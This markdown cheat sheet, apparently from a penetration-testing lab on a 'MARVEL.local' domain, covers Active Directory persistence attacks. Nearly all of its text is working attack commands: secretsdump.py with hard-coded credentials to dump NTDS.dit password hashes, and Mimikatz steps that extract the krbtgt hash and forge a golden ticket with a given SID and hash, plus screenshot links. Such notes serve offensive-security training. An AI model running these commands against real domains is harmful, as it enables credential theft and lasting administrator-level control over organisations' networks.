# Persistance Attacks

## Dumping NTDS.dit

    • secretsdump.py MARVEL.local/hawkeye:'Password123!'@192.168.146.149

    Dump only ntds.dit
    
    • secretsdump.py MARVEL.local/hawkeye:'Password123!'@192.168.146.149 -just-dc-ntlm

![alt text](Assests/ntds_1.png)


## Golden Ticket

Requirements
    NTLM of krbtgt
    SID of the domain
    
Mimikatz.exe
Priviledge::debug
Lsadump::lsa /inject /name:krbtgt

kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3384766056-2126254730-1791162011 /krbtgt:94ce154de7affd7dd10874a2f50ce5af /id:500 /ptt

![alt text](Assests/mimi_1.png)
![alt text](Assests/mimi_2.png)
![alt text](Assests/mimi_3.png)
![alt text](Assests/mimi_4.png)
![alt text](Assests/mimi_5.png)
![alt text](Assests/mimi_6.png)
![alt text](Assests/mimi_7.png)



